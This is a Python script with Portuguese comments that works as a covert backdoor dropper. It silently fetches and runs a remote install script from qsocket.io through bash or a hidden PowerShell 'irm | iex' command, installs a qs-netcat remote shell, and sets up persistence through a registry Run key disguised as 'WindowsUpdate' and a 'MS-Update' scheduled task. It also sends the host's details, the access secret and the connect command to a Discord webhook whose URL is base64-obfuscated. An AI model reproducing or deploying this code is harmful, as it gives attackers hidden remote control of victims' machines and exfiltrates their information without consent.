import os
import sys
import random
import string
import subprocess
import platform
import socket
import json
import base64
import urllib.request
import ssl
import time
from datetime import datetime

# ─────────────────────────────────────────
#  UTILS
# ─────────────────────────────────────────

def gen_secret(length=22):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def is_windows():
    return platform.system().lower() == 'windows'

def is_linux():
    return platform.system().lower() == 'linux'

# ─────────────────────────────────────────
#  INFO DO SISTEMA
# ─────────────────────────────────────────

def safe_http_get(url, timeout=8):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={'User-Agent': 'curl/7.88.1'})
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            return r.read().decode().strip()
    except:
        return None

def get_public_ip():
    for url in ['https://api.ipify.org', 'https://ifconfig.me', 'https://icanhazip.com']:
        r = safe_http_get(url)
        if r and len(r) < 50:
            return r
    return 'N/A'

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return 'N/A'

def get_kernel():
    try:
        return subprocess.run(['uname', '-r'], capture_output=True, text=True).stdout.strip()
    except:
        return 'N/A'

def get_arch():
    return platform.machine() or 'N/A'

def is_root():
    try:
        if is_linux():
            return os.geteuid() == 0
        if is_windows():
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except:
        pass
    return False

def get_os_info():
    try:
        with open('/etc/os-release') as f:
            for line in f:
                if line.startswith('PRETTY_NAME'):
                    return line.split('=')[1].strip().strip('"')
    except:
        pass
    return platform.platform()

def get_uptime():
    try:
        with open('/proc/uptime') as f:
            secs = float(f.read().split()[0])
        d = int(secs // 86400)
        h = int((secs % 86400) // 3600)
        m = int((secs % 3600) // 60)
        return f"{d}d {h}h {m}m"
    except:
        return 'N/A'

def get_cpu():
    try:
        with open('/proc/cpuinfo') as f:
            for line in f:
                if 'model name' in line:
                    return line.split(':')[1].strip()
    except:
        pass
    return platform.processor() or 'N/A'

def get_ram():
    try:
        with open('/proc/meminfo') as f:
            lines = f.readlines()
        total = int([l for l in lines if 'MemTotal'     in l][0].split()[1]) // 1024
        free  = int([l for l in lines if 'MemAvailable' in l][0].split()[1]) // 1024
        return f"{total - free}MB / {total}MB"
    except:
        return 'N/A'

def get_disk():
    try:
        r = subprocess.run(['df', '-h', '/'], capture_output=True, text=True)
        p = r.stdout.strip().split('\n')[-1].split()
        return f"{p[2]} / {p[1]} ({p[4]})"
    except:
        return 'N/A'

def get_interfaces():
    try:
        r = subprocess.run(['ip', '-br', 'addr'], capture_output=True, text=True)
        ifaces = [l.split() for l in r.stdout.strip().split('\n') if l.split()[0] != 'lo']
        return ', '.join(f"{i[0]}({i[2] if len(i)>2 else '?'})" for i in ifaces)
    except:
        return 'N/A'

def get_mac():
    try:
        import uuid
        return ':'.join(['{:02x}'.format((uuid.getnode() >> e) & 0xff)
                         for e in range(0, 8*6, 8)][::-1])
    except:
        return 'N/A'

def get_user():
    return os.environ.get('USER') or os.environ.get('USERNAME') or 'N/A'

def get_hostname():
    try:
        return socket.gethostname()
    except:
        return 'N/A'

def get_procs():
    try:
        return str(len([p for p in os.listdir('/proc') if p.isdigit()]))
    except:
        return 'N/A'

def get_shell():
    return os.environ.get('SHELL', 'N/A')

def get_crontab():
    try:
        r = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        lines = [l for l in r.stdout.strip().split('\n') if l and not l.startswith('#')]
        return f"{len(lines)} entradas"
    except:
        return 'N/A'

# ─────────────────────────────────────────
#  DISCORD
# ─────────────────────────────────────────

_cfg = [
    b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9h',
    b'cGkvd2ViaG9va3MvMTUzNjIyNzEw',
    b'Mjc5NjQyMzI0OC91RVFH',
    b'bFV4Q3lkazZfY1FVSF90',
    b'ZDlRTXBFeko0ekZSYjBw',
    b'SjZDMUFmX0x6NzJLVDZk',
    b'ZEhoby1aeEtIbnFQV0da',
    b'U041bg==',
]

def _ep():
    return base64.b64decode(b''.join(_cfg)).decode()

def send_discord(secret, tool, connect_cmd, success=True):
    agora    = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    cor      = 0x00FF00 if success else 0xFF0000
    status   = "[OK]" if success else "[FAIL]"
    root_str = "ROOT" if is_root() else get_user()

    payload = {
        "embeds": [{
            "title": f"{status} {tool}",
            "color": cor,
            "fields": [
                {"name": "Data/Hora",  "value": agora,            "inline": True},
                {"name": "Sistema",    "value": get_os_info(),    "inline": True},
                {"name": "Kernel",     "value": get_kernel(),     "inline": True},
                {"name": "Arch",       "value": get_arch(),       "inline": True},
                {"name": "CPU",        "value": get_cpu(),        "inline": False},
                {"name": "RAM",        "value": get_ram(),        "inline": True},
                {"name": "Disco",      "value": get_disk(),       "inline": True},
                {"name": "Uptime",     "value": get_uptime(),     "inline": True},
                {"name": "IP Publico", "value": get_public_ip(),  "inline": True},
                {"name": "IP Local",   "value": get_local_ip(),   "inline": True},
                {"name": "Interfaces", "value": get_interfaces(), "inline": False},
                {"name": "MAC",        "value": get_mac(),        "inline": True},
                {"name": "Hostname",   "value": get_hostname(),   "inline": True},
                {"name": "User/Root",  "value": root_str,         "inline": True},
                {"name": "Shell",      "value": get_shell(),      "inline": True},
                {"name": "Processos",  "value": get_procs(),      "inline": True},
                {"name": "Crontab",    "value": get_crontab(),    "inline": True},
                {"name": "Secret Key", "value": f"`{secret}`",    "inline": False},
                {"name": "Conectar",   "value": f"`{connect_cmd}`","inline": False},
            ],
            "footer": {"text": f"deploy.py | {get_hostname()} | {get_user()}"}
        }]
    }

    try:
        data = json.dumps(payload).encode()
        ctx  = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        req  = urllib.request.Request(
            _ep(), data=data,
            headers={'Content-Type': 'application/json', 'User-Agent': 'curl/7.88.1'},
            method='POST'
        )
        with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
            pass
    except:
        pass

# ─────────────────────────────────────────
#  DOWNLOAD
# ─────────────────────────────────────────

def download_script(url):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        req = urllib.request.Request(
            url, headers={'User-Agent': 'wget/1.21.3', 'Accept': '*/*'})
        with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
            content = r.read().decode()
            if content.strip().startswith('#'):
                return content
    except:
        pass

    for cmd in [
        ['curl', '-fsSk', url],
        ['wget', '-q', '--no-check-certificate', '-O', '-', url],
    ]:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if r.stdout and r.stdout.strip().startswith('#'):
                return r.stdout
        except:
            continue

    return None

# ─────────────────────────────────────────
#  VERIFICAR INSTALACAO DO QSOCKET
#  3 formas independentes — qualquer uma basta
#  1. binario existe em ~/.config
#  2. crontab tem entrada qs-netcat
#  3. processo rodando via pgrep
# ─────────────────────────────────────────

def verify_qsocket():
    # 1. binario em ~/.config (instalado pelo deploy)
    try:
        config = os.path.expanduser('~/.config')
        for d in os.listdir(config):
            binary = os.path.join(config, d, 'qs-netcat')
            if os.path.isfile(binary):
                return True
    except:
        pass

    # 2. crontab tem entrada do qsocket
    try:
        r = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        if 'qs-netcat' in r.stdout:
            return True
    except:
        pass

    # 3. processo rodando
    try:
        r = subprocess.run(['pgrep', '-f', 'qs-netcat'], capture_output=True)
        if r.returncode == 0:
            return True
    except:
        pass

    return False

# ─────────────────────────────────────────
#  QSOCKET LINUX
# ─────────────────────────────────────────

def deploy_qsocket_linux(secret):
    script = download_script('https://qsocket.io/0')
    if not script:
        return False

    env = os.environ.copy()
    env['S'] = secret
    env.pop('WAYLAND_DISPLAY', None)
    env.pop('WAYLAND_SOCKET', None)

    try:
        subprocess.run(
            ['bash', '-c', script],
            env=env, timeout=180,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass

    # verifica instalacao por 3 meios independentes
    time.sleep(3)
    return verify_qsocket()

# ─────────────────────────────────────────
#  QSOCKET WINDOWS
# ─────────────────────────────────────────

def deploy_qsocket_windows(secret):
    try:
        ps = f'$env:S="{secret}"; $env:HIDE=1; irm qsocket.io/1 | iex'
        subprocess.run(
            ['powershell', '-ExecutionPolicy', 'Bypass',
             '-WindowStyle', 'Hidden', '-Command', ps],
            timeout=180
        )
    except:
        pass

    time.sleep(3)

    # verifica por binario ou processo
    try:
        appdata = os.environ.get('APPDATA', '')
        for d in os.listdir(appdata):
            if os.path.isfile(os.path.join(appdata, d, 'qs-netcat.exe')):
                return True
    except:
        pass

    try:
        r = subprocess.run(['tasklist'], capture_output=True, text=True)
        if 'qs-netcat' in r.stdout:
            return True
    except:
        pass

    return False

def add_registry_windows(secret):
    try:
        import winreg
        cmd = f'powershell.exe -WindowStyle Hidden -Command "qs-netcat.exe -liqs {secret}"'
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r'Software\Microsoft\Windows\CurrentVersion\Run',
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, 'WindowsUpdate', 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(k)
    except:
        pass

def add_task_windows(secret):
    try:
        ps = f'''
        $A=New-ScheduledTaskAction -Execute "powershell.exe" `
           -Argument "-WindowStyle Hidden -Command `"qs-netcat.exe -liqs {secret}`""
        $T=New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask "MS-Update" -Action $A -Trigger $T -Force
        '''
        subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps],
                       timeout=30)
    except:
        pass

# ─────────────────────────────────────────
#  DAEMONIZE
#  pai: imprime pid e fecha
#  filho: nova sessao, stdout/stderr -> /dev/null
# ─────────────────────────────────────────

def daemonize():
    if not is_linux():
        return
    pid = os.fork()
    if pid > 0:
        sys.stdout.write(f"[*] Background pid: {pid}\n")
        sys.stdout.flush()
        os._exit(0)
    os.setsid()
    devnull = os.open(os.devnull, os.O_RDWR)
    os.dup2(devnull, 1)
    os.dup2(devnull, 2)
    os.close(devnull)

# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────

def main():
    secret = gen_secret()

    if is_linux():
        daemonize()
        ok = deploy_qsocket_linux(secret)
        connect_cmd = f"qs-netcat -i -s {secret}"
        send_discord(secret, "QSocket Linux", connect_cmd, success=ok)

    elif is_windows():
        ok = deploy_qsocket_windows(secret)
        connect_cmd = f"qs-netcat -i -s {secret}"
        send_discord(secret, "QSocket Windows", connect_cmd, success=ok)
        if ok:
            add_registry_windows(secret)
            add_task_windows(secret)

if __name__ == '__main__':
    main()
